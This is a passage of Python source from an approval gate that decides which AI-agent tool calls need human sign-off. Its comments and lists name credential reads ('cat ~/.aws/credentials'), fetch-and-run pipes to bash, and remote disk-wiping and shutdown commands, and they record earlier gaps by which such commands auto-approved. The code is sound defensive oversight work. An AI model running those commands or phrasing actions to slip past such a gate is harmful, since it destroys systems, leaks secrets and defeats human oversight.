    parts = _structured_action_parts(request, strip_inert=strip_inert)
    if request.proposed_action:
        prose = request.proposed_action
        parts.append(_strip_inert_spans(prose) if strip_inert else prose)
    text = " ".join(parts).lower()
    # Preserve the exact command text for flag-shaped signals while also making
    # structured operation names (create_refund/message_all_customers) readable
    # to the word-oriented risk patterns.
    return f"{text} {text.replace('_', ' ').replace('-', ' ')}"


def _structured_http_method(request: ApprovalRequest) -> str | None:
    tool_input = request.tool_input or {}
    if not isinstance(tool_input, Mapping):
        return None
    for key in ("method", "http_method"):
        value = tool_input.get(key)
        if isinstance(value, str) and value.strip():
            return value.strip().lower()
    command = tool_input.get("command")
    if not isinstance(command, str):
        return None
    try:
        tokens = shlex.split(command, posix=True)
    except ValueError:
        return None
    lowered = [token.lower() for token in tokens]
    if not lowered or Path(lowered[0]).name != "curl":
        return None
    for index, token in enumerate(lowered):
        if token in {"-x", "--request"} and index + 1 < len(lowered):
            return lowered[index + 1]
        if token.startswith("--request="):
            return token.partition("=")[2]
    if any(
        token in {"-d", "--data", "--data-raw", "--data-binary", "-f", "--form"}
        or token.startswith(("--data=", "--data-raw=", "--data-binary=", "--form="))
        for token in lowered
    ):
        return "post"
    return "get"


def _is_structurally_read_only(request: ApprovalRequest) -> bool:
    """Prove that a finance/customer operation is a read without trusting its class."""
    method = _structured_http_method(request)
    if method is not None:
        if method in _WRITE_HTTP_METHODS:
            return False
        return method in _READ_HTTP_METHODS

    tool_input = request.tool_input or {}
    if isinstance(tool_input, Mapping):
        operation = tool_input.get("operation")
        if isinstance(operation, str) and operation.strip():
            normalized = operation.strip().lower().replace("_", " ").replace("-", " ")
            return _READ_OPERATION_RE.match(normalized) is not None
        command = tool_input.get("command")
        if isinstance(command, str):
            try:
                tokens = shlex.split(command, posix=True)
            except ValueError:
                return False
            lowered = [token.lower() for token in tokens]
            if lowered:
                executable = Path(lowered[0]).name
                if executable in {"stripe", "paypal"}:
                    return any(_READ_OPERATION_RE.match(token) for token in lowered[1:])

    tool_name = str(request.tool_name or "").strip().lower()
    return tool_name in _TRUSTED_READ_TOOLS


def _provider_name(request: ApprovalRequest) -> str:
    """Normalize a structured tool/provider identifier for exact policy binding."""
    return re.sub(r"[^a-z0-9]+", "", str(request.tool_name or "").lower())


def _structured_operation(request: ApprovalRequest) -> str:
    tool_input = request.tool_input or {}
    if not isinstance(tool_input, Mapping):
        return ""
    value = tool_input.get("operation") or tool_input.get("action")
    if not isinstance(value, str):
        return ""
    return value.strip().lower().replace("_", " ").replace("-", " ")


def _payload_keys(request: ApprovalRequest) -> set[str]:
    tool_input = request.tool_input or {}
    if not isinstance(tool_input, Mapping):
        return set()
    keys: set[str] = set()
    for container in _STRUCTURED_CONTAINER_KEYS:
        value = tool_input.get(container)
        if isinstance(value, Mapping):
            keys.update(str(key).strip().lower().replace("_", " ") for key in value)
    return keys


def _is_structured_bank_write(request: ApprovalRequest) -> bool:
    provider = _provider_name(request)
    if provider not in _BANK_PROVIDERS:
        return False
    method = _structured_http_method(request)
    operation = _structured_operation(request)
    return method in _WRITE_HTTP_METHODS or _WRITE_OPERATION_RE.match(operation) is not None


def _is_structured_customer_write(request: ApprovalRequest) -> bool:
    """Recognize customer-record and outbound-message writes from tool structure."""
    provider = _provider_name(request)
    method = _structured_http_method(request)
    operation = _structured_operation(request)
    text = _haystack(request)
    write_shaped = method in _WRITE_HTTP_METHODS or _WRITE_OPERATION_RE.match(operation) is not None

    if provider in _CUSTOMER_RECORD_PROVIDERS and write_shaped:
        # Known CRM/customer systems fail closed on any structured write. The
        # record vocabulary additionally binds profile/person/lead variants.
        return True
    if write_shaped and _CUSTOMER_RECORD_RE.search(text):
        return True

    payload_keys = _payload_keys(request)
    has_recipients = bool(payload_keys & {"recipient", "recipients", "to", "phone numbers"})
    message_shaped = _MESSAGE_OPERATION_RE.search(operation) is not None
    if provider in _MESSAGE_PROVIDERS and (message_shaped or (write_shaped and has_recipients)):
        return True
    return has_recipients and message_shaped


def _all_sql_fields_additive(request: ApprovalRequest) -> bool:
    """A1.5 downgrade support: every ACTION field containing a SQL-shaped delete
    signal must itself parse as purely-additive SQL. At least one such field must
    exist and pass (fail closed)."""
    fields: list[str] = []
    if request.proposed_action:
        fields.append(request.proposed_action)
    tool_input = request.tool_input or {}
    if isinstance(tool_input, Mapping):
        for key in _ACTION_INPUT_KEYS:
            value = tool_input.get(key)
            if isinstance(value, str) and value:
                fields.append(value)
    checked = False
    for value in fields:
        lowered = value.lower()
        if any(shape in lowered for shape in _SQL_DELETE_SHAPES):
            checked = True
            if not (looks_like_sql(value) and is_additive_sql(value)):
                return False
    return checked


def _command_references_secret(command: str) -> bool:
    """True when any literal token of a shell command names a credential store.

    H3(a). :func:`tool_input_references_secret` only inspects a NATIVE read-tool's
    path arguments (``file_path``/``notebook_path``/``path``/``pattern``); a Bash
    ``command`` string is invisible to it. That is why ``cat ~/.aws/credentials``
    classified as ``hard_stop: none`` -- not merely unparked, undetected.

    Tokenizing here and reusing the SHARED resolver
    (:func:`omniagentos.secret_registry.references_secret`, the same one the shell
    classifier and the OS sandbox deny-list derive from) keeps this layer's
    definition of "secret" identical to theirs, which is the whole point of that
    registry. A regex split is used rather than :func:`shlex.split` on purpose:
    it cannot raise on unbalanced quoting, and it separates a path from the pipe
    or ``@``-prefix it is packed against.
    """
    for raw in _SECRET_TOKEN_SPLIT_RE.split(command):
        if not raw:
            continue
        for candidate in (raw, _SECRET_TOKEN_PREFIX_RE.sub("", raw)):
            if candidate and references_secret(candidate, None):
                return True
    return False


# Fields whose VALUE can name a credential store. Free-text fields stay out for
# the same reason they stay out of _ACTION_INPUT_KEYS: a file whose CONTENT
# mentions a key path is not itself a credential read.
_SECRET_SCAN_KEYS: tuple[str, ...] = (
    "command",
    "cmd",
    "script",
    "file_path",
    "path",
    "notebook_path",
    "filename",
    "file",
    "target",
    "destination",
)


def _secret_audit_signal(request: ApprovalRequest) -> bool:
    tool_input = dict(request.tool_input) if isinstance(request.tool_input, Mapping) else {}
    if tool_input_references_secret(tool_input, None):
        return True
    for key in _SECRET_SCAN_KEYS:
        value = tool_input.get(key)
        if not isinstance(value, str) or not value:
            continue
        if key in _PATH_INPUT_KEYS and references_secret(value, None):
            return True
        if _command_references_secret(value):
            return True
    command = tool_input.get("command")
    return isinstance(command, str) and _ENV_DUMP_RE.search(command) is not None


def _delete_hits(request: ApprovalRequest) -> set[str]:
    text = _haystack(request)
    hits = {match.group(0) for match in _DELETE_RE.finditer(text)}
    hits.update(signal for signal in _SUBSTRING_DELETE_SIGNALS if signal in text)
    hits.update(signal for signal in _ORM_DELETE_SIGNALS if signal in text)
    return hits


def _delete_scope(request: ApprovalRequest, delete_hits: set[str]) -> TargetScope:
    """Classify all resolvable targets for one delete-shaped request.

    Prefer structured action fields (command/path). Free-text ``proposed_action``
    is only consulted when no structured field is present — a prose summary like
    "delete the temp workspace" must not poison a proven local-temp command path.
    """
    scopes: list[TargetScope] = []
    fields: list[str] = []
    tool_input = request.tool_input or {}
    if isinstance(tool_input, Mapping):
        for key in _ACTION_INPUT_KEYS:
            value = tool_input.get(key)
            if isinstance(value, str) and value:
                # Direct path fields are targets; command-like fields are parsed by
                # classify_target_scope. Both use the same containment rule.
                if key in _PATH_INPUT_KEYS or any(hit in value.lower() for hit in delete_hits):
                    fields.append(value)
            elif key in _PATH_INPUT_KEYS and isinstance(value, list | tuple):
                fields.extend(str(item) for item in value)

    # Only fall back to proposed_action when the request has no structured targets.
    if not fields and request.proposed_action:
        fields.append(request.proposed_action)

    for value in fields:
        scopes.append(classify_target_scope(value))

    if "production" in scopes:
        return "production"
    if "unresolved" in scopes or not scopes:
        return "unresolved"
    return "local_temp"


def _segment_words(segment: str) -> list[str]:
    """Whitespace words of one pipeline segment, stripped of quoting noise."""
    words: list[str] = []
    for raw in segment.split():
        word = raw.strip("\"'`;&()").lstrip("<>")
        if word:
            words.append(word)
    return words


def _leading_executable(segment: str) -> str:
    """The command a segment actually runs, past env assignments and wrappers."""
    for word in _segment_words(segment):
        if _ENV_ASSIGN_RE.match(word):
            continue
        lowered = word.lower()
        if lowered in _COMMAND_PREFIXES:
            continue
        if lowered in _EVAL_SINKS:
            return lowered
        return Path(lowered).name or lowered
    return ""


def _reads_program_from_stdin(segment: str) -> bool:
    """True when this segment's interpreter takes its PROGRAM from stdin.

    ``bash`` / ``python`` with no script operand read the program itself; that is
    the shape that executes a piped payload. ``python process.py`` and
    ``python -c "print(1)"`` name the program inline, so stdin is only data and
    the request stays readable -- which is what keeps the required true-negative
    ``cat file.csv | python process.py`` auto-approving.
    """
    words = _segment_words(segment)
    index = 0
    while index < len(words) and (
        _ENV_ASSIGN_RE.match(words[index]) or words[index].lower() in _COMMAND_PREFIXES
    ):
        index += 1
    if index >= len(words):
        return False
    if Path(words[index].lower()).name not in _STDIN_INTERPRETERS:
        return False
    operands = words[index + 1 :]
    if any(word in {"-s", "-"} for word in operands):
        return True
    return not any(not word.startswith("-") for word in operands)


def _split_top_level(text: str, separators: tuple[str, ...]) -> list[str]:
    """Split on ``separators`` that are NOT inside quotes or a substitution.

    A naive ``re.split`` cuts inside ``echo 'a; b'`` and inside ``$( … ; … )``,
    which is how a splitter starts inventing statement boundaries that the shell
    would never see. ``separators`` must be ordered longest-first so ``&&`` is
    consumed before ``&`` and ``||`` before ``|``.
    """
    parts: list[str] = []
    buf: list[str] = []
    quote: str | None = None
    depth = 0
    index = 0
    length = len(text)
    while index < length:
        char = text[index]
        if quote is not None:
            buf.append(char)
            if char == quote:
                quote = None
            index += 1
            continue
        if char in "'\"":
            quote = char
            buf.append(char)
            index += 1
            continue
        if text.startswith(("$(", "<("), index):
            depth += 1
            buf.append(text[index : index + 2])
            index += 2
            continue
        if char == "(":
            depth += 1
            buf.append(char)
            index += 1
            continue
        if char == ")" and depth > 0:
            depth -= 1
            buf.append(char)
            index += 1
            continue
        if depth == 0:
            hit = next((sep for sep in separators if text.startswith(sep, index)), None)
            if hit is not None:
                parts.append("".join(buf))
                buf = []
                index += len(hit)
                continue
        buf.append(char)
        index += 1
    parts.append("".join(buf))
    return parts


# Statement separators, longest-first. Splitting on these BEFORE looking at pipes
# is what makes the producer resolve at the right boundary.
_STATEMENT_SEPARATORS: tuple[str, ...] = ("&&", "||", ";", "\n")
# A ``<`` redirect, but never ``<(`` -- process substitution is handled as a
# substitution, not as a file redirect.
_REDIRECT_RE = re.compile(r"<<<|<<|<(?!\()")


def _redirects_opaque_body(statement: str) -> bool:
    """True when an interpreter is fed a body through ``<`` / ``<<`` / ``<<<``.

    Redirection is the same act as the pipe: an interpreter consuming a body that
    is not statically visible. The inverted test applies unchanged --

      ``<``    a FILE's body is never in the request text            -> opaque
      ``<<<``  a here-STRING is opaque only if it expands something  -> ``$``/backtick
      ``<<``   a here-DOC's body follows literally in the text, so the classifiers
               above can read it and judge it on its merits          -> knowable

    Redirecting into a NON-interpreter (``sort < data.txt``) is untouched.
    """
    if Path(_leading_executable(statement)).name not in _STDIN_INTERPRETERS:
        return False
    # Only operators OUTSIDE quotes count; `echo "a < b"` redirects nothing.
    scanned = statement
    quote: str | None = None
    index = 0
    while index < len(scanned):
        char = scanned[index]
        if quote is not None:
            if char == quote:
                quote = None
            index += 1
            continue
        if char in "'\"":
            quote = char
            index += 1
            continue
        match = _REDIRECT_RE.match(scanned, index)
        if match is None:
            index += 1
            continue
        operator = match.group(0)
        operand = scanned[match.end() :].strip()
        if operator == "<":
            return True
        if operator == "<<<":
            if "$" in operand or "`" in operand:
                return True
        index = match.end()
    return False


def _is_opaque_payload_execution(command: str) -> bool:
    """True when unreadable content is routed into an interpreter.

    Four shapes, all the same defect:

    1. ``<anything but a literal printer> | bash``  -- pipe into an interpreter
       that reads its program from stdin;
    2. ``bash -c "$(...)"`` / ``eval "$(...)"`` / ``. <(...)`` -- a command's
       OUTPUT substituted in as code;
    3. ``source <file>`` / ``. <file>`` -- a file body executed in this shell;
    4. ``bash < script.sh`` / ``python <<< "$payload"`` -- an interpreter fed a
       body through redirection.

    STATEMENT BOUNDARIES MATTER. The producer that feeds an interpreter is the
    LAST statement before the pipe, not the first thing in the string. Resolving
    it from the whole upstream made ``echo ok; curl https://x.sh | bash`` report
    its producer as ``echo`` -- a transparent literal printer -- and auto-approve.
    The leading command has to be TRANSPARENT for that to happen, which is why
    ``git pull …; curl … | bash`` parked and hid the bug; ``echo``/``printf``
    first is the most natural thing an author would write.
    """
    text = command.lower()

    # 2. Substitution whose output becomes code.
    for match in _SUBSTITUTION_RE.finditer(text):
        inner = next((group for group in match.groups() if group), "")
        if not inner.strip():
            continue
        outer = _leading_executable(text[: match.start()] or text)
        if outer not in _EVAL_SINKS and Path(outer).name not in _STDIN_INTERPRETERS:
            continue
        if _leading_executable(inner) not in _TRANSPARENT_SOURCE_COMMANDS:
            return True

    for statement in _split_top_level(text, _STATEMENT_SEPARATORS):
        if not statement.strip():
            continue

        # 3. A file body executed in the current shell.
        words = _segment_words(statement)
        if words and words[0].lower() in {"source", "."} and len(words) > 1:
            return True

        # 4. An interpreter fed a body through redirection.
        if _redirects_opaque_body(statement):
            return True

        # 1. Pipe into a stdin-reading interpreter. Splitting statements FIRST is
        # what keeps a previous statement's executable out of this pipeline.
        stages = _split_top_level(statement, ("|",))
        for upstream, downstream in zip(stages, stages[1:], strict=False):
            if not _reads_program_from_stdin(downstream):
                continue
            producer = _leading_executable(upstream)
            if producer and producer in _TRANSPARENT_SOURCE_COMMANDS:
                # The body is a literal in the request text, so the classifiers
                # above CAN read it and judge it on its merits.
                continue
            return True
    return False


def _opaque_payload_execution(request: ApprovalRequest) -> bool:
    tool_input = request.tool_input or {}
    fields: list[str] = []
    if isinstance(tool_input, Mapping):
        for key in ("command", "cmd", "script"):
            value = tool_input.get(key)
            if isinstance(value, str) and value:
                fields.append(value)
    if not fields and request.proposed_action:
        fields.append(request.proposed_action)
    return any(_is_opaque_payload_execution(value) for value in fields)


def _action_target_fields(request: ApprovalRequest) -> list[str]:
    """Every action-bearing string a target could be resolved from."""
    fields: list[str] = []
    tool_input = request.tool_input or {}
    if isinstance(tool_input, Mapping):
        for key in _ACTION_INPUT_KEYS:
            value = tool_input.get(key)
            if isinstance(value, str) and value:
                fields.append(value)
            elif key in _PATH_INPUT_KEYS and isinstance(value, list | tuple):
                fields.extend(str(item) for item in value)
    if not fields and request.proposed_action:
        fields.append(request.proposed_action)
    return fields


def _unbounded_target_scope(request: ApprovalRequest) -> TargetScope | None:
    """The failing scope when NO action field proves an isolated target.

    ``None`` means every resolvable target was proven bounded (an isolated local
    temp root, or an explicitly granted scope), so the caller may stand down.
    A request with nothing resolvable at all is ``unresolved`` -- absence of
    evidence is not evidence of safety.
    """
    scopes = [classify_target_scope(value) for value in _action_target_fields(request)]
    if not scopes:
        return "unresolved"
    if all(scope in _BOUNDED_SCOPES for scope in scopes):
        return None
    return "production" if "production" in scopes else "unresolved"


def _resolve_actual_target_scope(request: ApprovalRequest) -> TargetScope:
    """Resolve the actual classified target scope for a truthful decision audit."""
    scopes = [classify_target_scope(value) for value in _action_target_fields(request)]
    if not scopes:
        return "none"
    if "production" in scopes:
        return "production"
    if "unresolved" in scopes:
        return "unresolved"
    if "in_granted_scope" in scopes:
        return "in_granted_scope"
    if "local_temp" in scopes:
        return "local_temp"
    return "none"


def _durable_write_floor(
    request: ApprovalRequest, text: str
) -> tuple[HardStop, TargetScope] | None:
    """H1's park-by-default rule for a write-shaped request nobody enumerated.

    THE KEYWORD LISTS ABOVE ARE A DENYLIST, AND DENYLISTS LOSE. Every signal in
    this module had to be thought of in advance; the request that gets through is
    by definition the phrasing that was not. This floor does not try to name the
    dangerous thing. It asks two structural questions and refuses to guess:

      1. Is the action WRITE-SHAPED?  (a destructive or a value-moving verb)
      2. Does it name something that MATTERS? (a production / customer / money noun)

    If both hold, the request may only auto-approve when its target is PROVEN
    bounded -- an isolated local-temp path, or an explicitly granted scope. An
    unresolvable target parks. That is the fail-closed direction: uncertainty
    resolves to "ask a human", never to "run it".

    Two escapes keep this from becoming a park-everything rule, which would be
    just as broken as the approve-everything one it replaces:

      * a STRUCTURALLY PROVEN read (``GET``, a read-shaped operation name, a
        trusted read tool) is never a write, whatever nouns it mentions -- this
        is what keeps ``GET /customers``/``retrieve_charge`` auto-approving;
      * a target proven inside an isolated root stands the floor down for an
        ordinary deletion, but never for a money/customer write.

    The verb and the noun must BOTH be present. ``vercel deploy --prod`` names a
    production noun with no write-shaped verb; ``ls -la /srv/prod`` is a read.
    Neither reaches this rule.

    ``text`` is the INERT-STRIPPED haystack, and both halves are judged on it. A
    word inside a commit message or a document path is neither a verb nor a noun
    of the action: ``edit docs/payments/sepa-overview.md`` matched ``payments``
    as a value-move verb (``pay\\w*``) and ``sepa`` as a rail, and parked a docs
    edit as a money move until the two halves were read from the same text.
    """
    destructive = _DESTRUCTIVE_VERB_RE.search(text) is not None
    value_move = _VALUE_MOVE_VERB_RE.search(text) is not None
    if not (destructive or value_move):
        return None

    money_noun = _names_money(text)
    customer_noun = _CUSTOMER_NOUN_RE.search(text) is not None
    production_noun = _PRODUCTION_NOUN_RE.search(text) is not None
    if not (money_noun or customer_noun or production_noun):
        return None

    if _is_structurally_read_only(request):
        return None

    actual_scope = _resolve_actual_target_scope(request)

    if value_move and money_noun:
        return "money", actual_scope
    if customer_noun and not destructive:
        return "customer", actual_scope

    unbounded_scope = _unbounded_target_scope(request)
    if unbounded_scope is None:
        return None
    return "delete", unbounded_scope


# ---------------------------------------------------------------------------
# C1 -- the narrow park-list for irreversible NON-FINANCE actions.
# Ratified by the operator on 2026-08-04; recorded in DECISIONS.md ("C1 non-finance
# park-list") and described in docs/architecture/governance.md.
# ---------------------------------------------------------------------------
#
# WHAT THIS FIXES. Everything above resolves a FINANCE question. When it answers
# "no finance risk here", :func:`resolve_approval` auto-approves with no human --
# and that fall-through covered the two most consequential NON-finance acts the
# system can take. Measured on this file's own pre-C1 HEAD, at the ActionClass
# the live hook-eval path (``api/routes/sessions.py`` -> ``classify_shell``)
# computes for each command:
#
#     vercel deploy --prod                       irreversible  -> AUTO-APPROVED
#     gcloud app deploy app.yaml --quiet         irreversible  -> AUTO-APPROVED
#     kubectl apply -f k8s/prod/deploy.yaml      irreversible  -> AUTO-APPROVED
#     terraform apply -auto-approve              irreversible  -> AUTO-APPROVED
#     ssh prod-web-01 'shutdown -h now'          consequential -> AUTO-APPROVED
#     ssh prod-web-01 'mkfs.ext4 /dev/sdb1'      consequential -> AUTO-APPROVED
#     ssh prod-web-01 'systemctl stop app'       consequential -> AUTO-APPROVED
#     kubectl exec -it web-0 -- sh -c 'kill 1'   irreversible  -> AUTO-APPROVED
#
# THE RULING IS DELIBERATELY NARROW. Parking EVERY irreversible action was
# REJECTED: ``HARD_STOP_CLASSES`` / :func:`omniagentos.policy.is_hard_stop` are
# the frozen cross-package class floor that auto-provisioning grants scope from,
# and widening them breaks it. Neither is imported, read or rebound here. This is
# an ADDITIVE resolver step over two explicitly enumerated surfaces -- production
# deploys and remote destructive commands -- and nothing else changes.
#
# THE RULE IS A CONJUNCTION: (class floor) AND (enumerated surface). Both halves
# are load-bearing. The class half is CONSEQUENTIAL-or-higher, exactly as the operator
# worded it, so a deploy classified merely ``consequential`` is not a hole; the
# surface half is what keeps ``make build`` and ``pytest -q`` -- which
# ``classify_shell`` ALSO calls ``irreversible`` -- running hands-off.
#
# ENUMERATED EXPLICITLY, NEVER PATTERN-MATCHED LOOSELY. This file's comments are a
# graveyard of near-misses, so every match here is STRUCTURAL: a token only counts
# when it sits at a COMMAND POSITION (the executable of a statement, or the
# executable of a remote transport's payload), never when it merely appears in the
# text. That is what separates ``terraform apply`` from
# ``grep -rn "terraform apply" docs/``, and ``ssh host 'shutdown -h now'`` from
# ``ssh host 'grep -r kill /etc'``.
#
# NOT ENUMERATED, ON PURPOSE (each would trade a real defect for a swarm of false
# positives, and "widen nothing else" was part of the ruling): ``git push`` of any
# kind (a branch legitimately named ``prod`` is common, and ``push --force`` is
# already a delete signal), plain file copies to a server, package installs, and
# LOCAL destructive commands (the ruling names REMOTE ones; local deletes are
# already the delete floor's job).

# Trigger labels for the audit reason. These are NOT ``HardStop`` members: the
# AD-15 hard-stop vocabulary stays finance-only and is pinned by
# ``tests/orchestrator/test_approvals_floors.py::test_hard_stop_vocab_is_finance_only_ad15``.
PARK_LIST_PRODUCTION_DEPLOY = "production-deploy"
PARK_LIST_REMOTE_DESTRUCTIVE = "remote-destructive"
# Fail-closed sentinel: the park-list could not be evaluated at all.
PARK_LIST_UNEVALUABLE = "park-list-unevaluable"
PARK_LIST_TRIGGERS: frozenset[str] = frozenset(
    {PARK_LIST_PRODUCTION_DEPLOY, PARK_LIST_REMOTE_DESTRUCTIVE, PARK_LIST_UNEVALUABLE}
)

# The class half of the conjunction: "irreversible / consequential".
_PARK_LIST_CLASS_FLOOR: frozenset[ActionClass] = frozenset(
    {ActionClass.CONSEQUENTIAL, ActionClass.IRREVERSIBLE}
)

# Deploy invocations whose DEFAULT target is the live environment: they need no
# ``--prod`` marker because they have no preview mode to fall back to.
# ``(executable, tokens that must all appear after it)``.
_PRODUCTION_DEFAULT_DEPLOYS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("gcloud", ("deploy",)),  # gcloud app|run|functions deploy
    ("firebase", ("deploy",)),
    ("fly", ("deploy",)),
    ("flyctl", ("deploy",)),
    ("eb", ("deploy",)),
    ("serverless", ("deploy",)),
    ("sls", ("deploy",)),
    ("wrangler", ("deploy",)),
    ("wrangler", ("publish",)),
    ("kubectl", ("apply",)),
    ("kubectl", ("rollout",)),
    ("kubectl", ("replace",)),
    ("kubectl", ("scale",)),
    ("helm", ("upgrade",)),
    ("helm", ("install",)),
    ("helm", ("rollback",)),
    ("terraform", ("apply",)),
    ("tofu", ("apply",)),
    ("pulumi", ("up",)),
    ("cdk", ("deploy",)),
    ("owner", ("deploy",)),
    ("aws", ("cloudformation", "deploy")),
    ("aws", ("deploy", "create-deployment")),
    ("docker", ("stack", "deploy")),
    ("dokku", ("deploy",)),
    ("railway", ("up",)),
    # A registry publish IS a production release: the artifact becomes the one the
    # world installs, and nothing in this system can take it back. ``docker push``
    # is deliberately absent -- pushing an image is routinely a CI step BEFORE a
    # deploy, not the release itself.
    ("npm", ("publish",)),
    ("yarn", ("publish",)),
    ("pnpm", ("publish",)),
    ("cargo", ("publish",)),
    ("gem", ("push",)),
    ("twine", ("upload",)),
)

# Deploy tools whose DEFAULT target is a preview/draft: they park only when the
# request explicitly names production. ``vercel``/``netlify`` without ``--prod``
# publish a throwaway preview URL, which is ordinary engineering work.
_PRODUCTION_MARKED_DEPLOYS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("vercel", ()),
    ("netlify", ("deploy",)),
    ("ansible-playbook", ()),
)

# Flags that prove the invocation does not actually deploy anything.
_DEPLOY_INERT_MARKERS: tuple[str, ...] = ("--dry-run", "--dryrun", "--help", "--version")

# The DURABLE half of the deploy surface, for the tool nobody enumerated: a deploy
# VERB at a command position (the executable itself, a task runner's target, or an
# interpreter's script) AIMED at an explicitly named production target. Both halves
# must hold, which is what keeps ``make build`` (runner, no verb), ``make deploy``
# (verb, no production target) and ``cat deploy-prod.sh`` (verb in an ARGUMENT, not
# at a command position) out of it.
#
# Deliberately ABSENT: "release" and "ship". ``tar czf backup.tgz
# /srv/production/releases`` is a BACKUP, and "releases" is the conventional name
# of a deploy directory -- carrying that verb would park archives of one.
_DEPLOY_VERB_RE = re.compile(r"\b(?:deploy|redeploy|rollout|cutover|promote)\w*")
_PRODUCTION_TARGET_RE = re.compile(r"\b(?:prod|production)\b")

# Remote executables that destroy or halt host state. Every one is a COMMAND NAME,
# and none has a read-only mode.
_REMOTE_DESTRUCTIVE_COMMANDS: frozenset[str] = frozenset(
    {
        "shutdown",
        "poweroff",
        "halt",
        "reboot",
        "fdisk",
        "parted",
        "sgdisk",
        "wipefs",
        "dd",
        "shred",
        "rm",
        "rmdir",
        "unlink",
        "truncate",
        "rimraf",
        "kill",
        "killall",
        "pkill",
        "userdel",
        "groupdel",
        "deluser",
        "delgroup",
        "dropdb",
        "dropuser",
        "lvremove",
        "vgremove",
        "pvremove",
    }
)
# ``mkfs`` ships as mkfs.ext4 / mkfs.xfs / mkfs.btrfs -- a family, not a name.
_REMOTE_DESTRUCTIVE_PREFIXES: tuple[str, ...] = ("mkfs",)

# Remote commands that are destructive ONLY in certain modes. Enumerating the
# SUBCOMMAND is the whole point: ``systemctl restart`` and ``docker ps`` are
# ordinary operations, and a matcher keyed on the executable alone would park them.
# (The golden corpus pins ``ssh host 'systemctl restart nginx'`` as a
# must-auto-approve row for exactly this reason.)
_REMOTE_DESTRUCTIVE_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "systemctl": frozenset({"stop", "disable", "mask", "kill", "poweroff", "reboot", "halt"}),
    "service": frozenset({"stop"}),
    "launchctl": frozenset({"unload", "bootout", "remove"}),
    "supervisorctl": frozenset({"stop", "remove"}),
    "pm2": frozenset({"delete", "stop", "kill"}),
    "docker": frozenset({"rm", "rmi", "kill", "prune"}),
    "podman": frozenset({"rm", "rmi", "kill", "prune"}),
    "kubectl": frozenset({"delete", "drain"}),
    "apt": frozenset({"remove", "purge", "autoremove"}),
    "apt-get": frozenset({"remove", "purge", "autoremove"}),
    "yum": frozenset({"remove", "erase"}),
    "dnf": frozenset({"remove", "erase"}),
    "apk": frozenset({"del"}),
    "iptables": frozenset({"-f", "--flush", "-x", "--delete-chain"}),
    "ip6tables": frozenset({"-f", "--flush", "-x", "--delete-chain"}),
    "ufw": frozenset({"disable", "reset"}),
    "crontab": frozenset({"-r"}),
    "redis-cli": frozenset({"flushall", "flushdb"}),
    "zfs": frozenset({"destroy"}),
    "virsh": frozenset({"destroy", "undefine"}),
    "init": frozenset({"0", "6"}),
}

# Transports whose PAYLOAD is another command line. Resolving the payload is what
# lets the surface be judged at a command position instead of by keyword.
_PARK_LIST_SSH_TRANSPORTS: frozenset[str] = frozenset({"ssh", "mosh"})
# ``ssh`` flags that consume the following token, so the destination is not
# mistaken for the payload.
_PARK_LIST_SSH_VALUE_FLAGS: frozenset[str] = frozenset(
    {"-b", "-c", "-d", "-e", "-f", "-i", "-j", "-l", "-m", "-o", "-p", "-q", "-r", "-s", "-w"}
)
_PARK_LIST_EXEC_TRANSPORTS: frozenset[str] = frozenset({"kubectl", "docker", "podman"})
# Interpreters whose ``-c`` operand is a command line, and whose first script
# operand names what is being run.
_PARK_LIST_INTERPRETERS: frozenset[str] = frozenset(
    {"bash", "sh", "zsh", "ksh", "dash", "python", "python3", "ruby", "node", "perl", "php"}
)
# Task runners whose immediate target names the action (``make deploy-prod``).
_PARK_LIST_TASK_RUNNERS: frozenset[str] = frozenset(
    {
        "make",
        "just",
        "npm",
        "npx",
        "yarn",
        "pnpm",
        "rake",
        "fab",
        "invoke",
        "task",
        "mage",
        "cap",
        "bundle",
        "poetry",
        "nx",
        "turbo",
        "gradle",
        "mvn",
    }
)
_PARK_LIST_QUOTE_RE = re.compile(r"[\"'`]")
_PARK_LIST_WORDISH_RE = re.compile(r"[^a-z0-9]+")
# ``--command=…`` / ``commands=["reboot"]`` pack the real command line behind an
# ``=``; splitting there is what lets the two API-shaped transports be read at all.
_PARK_LIST_PACKED_RE = re.compile(r"^(?:--command|commands|--parameters)=(.*)$")
_PARK_LIST_MAX_NESTING = 4


def _park_list_class_floor_reached(label: str) -> bool:
    """CONSEQUENTIAL-or-higher.

    Fails CLOSED on an unknown/malformed class, in the same direction
    :func:`omniagentos.policy.is_hard_stop` already fails -- but it is a SEPARATE
    predicate over a SEPARATE set, so the frozen class floor is untouched.
    """
    try:
        return ActionClass(label) in _PARK_LIST_CLASS_FLOOR
    except (TypeError, ValueError):
        return True


def _park_list_fields(request: ApprovalRequest) -> list[str]:
    """Action-bearing text the park-list is allowed to read.

    Same field discipline as :func:`_opaque_payload_execution`. These are read RAW
    (not inert-stripped): the money floors strip paths and commit messages because
    a NOUN in prose is not a money move, but here the path IS the executable --
    ``./deploy.sh production`` would otherwise lose the very token that names the
    action. Reading prose safely is instead handled structurally, by only ever
    matching at a command position.
    """
    tool_input = request.tool_input or {}
    raw: list[str] = []
    if isinstance(tool_input, Mapping):
        for key in ("command", "cmd", "script"):
            value = tool_input.get(key)
            if isinstance(value, str) and value:
                raw.append(value)
    if request.proposed_action:
        raw.append(request.proposed_action)
    return [value for value in (item.strip() for item in raw) if value]


def _park_list_segments(field: str) -> list[str]:
    """Quote-aware statement / pipeline segments of one field.

    ``_split_top_level`` deliberately does not cut inside quotes, so a remote
    payload (``ssh host 'a && b'``) stays attached to its transport -- which is
    what makes "is this segment remote?" answerable at all.
    """
    segments: list[str] = []
    for statement in _split_top_level(field, _STATEMENT_SEPARATORS):
        segments.extend(_split_top_level(statement, ("|",)))
    return [segment.strip() for segment in segments if segment.strip()]


def _park_list_strip_prefixes(words: list[str]) -> list[str]:
    """Drop env assignments and wrappers so ``words[0]`` is the real executable."""
    index = 0
    while index < len(words) and (
        _ENV_ASSIGN_RE.match(words[index]) or words[index].lower() in _COMMAND_PREFIXES
    ):
        index += 1
    return words[index:]


def _park_list_operand_window(words: list[str], limit: int) -> list[str]:
    """The first ``limit`` NON-FLAG operands after the executable.

    A window, not "anywhere after the executable": ``apt list --installed`` must
    not read as ``apt remove`` because some later token happens to say remove.
    """
    window: list[str] = []
    for word in words[1:]:
        if word.startswith("-"):
            continue
        window.append(word)
        if len(window) >= limit:
            break
    return window


def _park_list_nested_payload(words: list[str]) -> list[str] | None:
    """The command line a transport/interpreter hands to something else, if any."""
    if not words:
        return None
    executable = Path(words[0].lower()).name
